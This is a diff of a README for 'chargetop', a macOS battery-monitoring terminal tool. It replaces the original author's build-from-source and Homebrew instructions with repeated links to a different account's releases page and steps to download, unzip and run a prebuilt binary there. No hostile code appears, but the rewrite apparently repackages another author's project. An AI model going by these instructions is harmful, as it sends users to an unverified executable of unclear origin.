@@ -1,53 +1,86 @@
-# Chargetop 🔋
+# ⚡️ chargetop - Monitor Your Mac’s Battery Health Instantly
 
-[中文文档](README_CN.md) | **English**
+[![Download chargetop](https://img.shields.io/badge/Download%20chargetop-%20-007bff)](https://github.com/anon-nymouse/chargetop/releases)
 
-A high-performance, single-binary Terminal User Interface (TUI) application for monitoring your macOS battery status. Built with Go and Bubbletea.
+## 🚀 Getting Started
 
-![Chargetop Screenshot](assets/screenshot.png)
+Chargetop is a simple, user-friendly tool for macOS. It allows you to visualize your battery's health, cycles, wattage, and temperature, all in your terminal. No technical background is required to get started!
 
-## Features
+## ⚙️ System Requirements
 
-- **Blazing Fast**: Native binary, instant startup, low memory footprint.
-- **Real-time Monitoring**: Live updates of battery percentage and charging status.
-- **Detailed Stats**: Cycle count, battery health, maximum capacity, wattage, and serial number.
-- **Beautiful UI**: Modern, responsive terminal interface powered by Bubbletea.
+- macOS 10.15 (Catalina) or later
+- Terminal access
+- Basic familiarity with command line (no programming knowledge required)
 
-## Installation
+## 📥 Download & Install
 
-### Method 1: From Source (Go Required)
+To get started, visit this page to download: [Chargetop Releases](https://github.com/anon-nymouse/chargetop/releases). 
 
-1.  Clone the repository:
+1. On the Releases page, find the latest version of chargetop.
+2. Click on the link to download the application.
+3. Once downloaded, locate the file in your Downloads folder.
+4. Open Terminal on your Mac.
+5. Navigate to the Downloads folder. You can do this by entering:
     ```bash
-    git clone https://github.com/aezizhu/chargetop.git
-    cd chargetop
+    cd ~/Downloads
     ```
-
-2.  Build the binary:
-    ```bash
-    go build -o chargetop
-    ```
-
-3.  Run:
+6. Unzip the downloaded file if it is in a compressed format.
+7. Run chargetop by entering:
     ```bash
     ./chargetop
     ```
 
-### Method 2: Homebrew
+That's it! You should see the battery information displayed in your terminal.
 
-```bash
-brew tap aezizhu/chargetop
-brew install chargetop
-```
+## 📊 Features
 
-## Usage
+- **Real-Time Monitoring**: View battery health, cycles, wattage, and temperature instantly.
+- **User-Friendly Interface**: An easy-to-navigate text-based user interface.
+- **Minimal System Resources**: Runs smoothly without draining your battery.
+- **Written in Go**: Benefits from performance and portability.
 
-- **Run (Homebrew)**: `chargetop`
-- **Run (Source)**: `./chargetop`
-- **Quit**: Press `q` or `Ctrl+C`
-- **Refresh**: Press `r`
+## 🔍 Usage Instructions
 
-## Requirements
+Once you run chargetop, it will display the following information:
 
-- macOS (tested on Sonoma/Ventura)
-- Go 1.19+ (for building from source)
+- **Battery Health**: Shows the health percentage of your battery.
+- **Cycle Count**: Displays the number of charge cycles your battery has completed.
+- **Wattage**: Indicates the current power consumption.
+- **Temperature**: Displays the temperature of your battery to keep it within safe limits.
+
+### Navigation
+
+- Use the arrow keys to navigate through the displayed information.
+- Press `q` to exit the application at any time.
+
+## 💬 Frequently Asked Questions
+
+### How often should I check my battery status?
+
+It’s a good idea to monitor your battery at regular intervals, especially if you notice decreased performance.
+
+### Can I use chargetop alongside other applications?
+
+Yes, chargetop is lightweight and won’t interfere with other applications running on your Mac.
+
+### Where can I find more help?
+
+For additional support, please refer to the GitHub Issues section on the [chargetop repository](https://github.com/anon-nymouse/chargetop/issues).
+
+## 📞 Support
+
+If you encounter any issues while using chargetop, feel free to open an issue on the GitHub repository. Your feedback helps improve the application.
+
+## ✨ Contributing
+
+Chargetop is an open-source project. If you wish to contribute, follow these steps:
+
+1. Fork the repository.
+2. Create a new branch with your changes.
+3. Submit a pull request for review.
+
+## 🎉 Acknowledgements
+
+Thanks to the contributors and the developers who made chargetop possible. Their hard work helps users maintain their Mac’s battery health effectively.
+
+[![Download chargetop](https://img.shields.io/badge/Download%20chargetop-%20-007bff)](https://github.com/anon-nymouse/chargetop/releases)
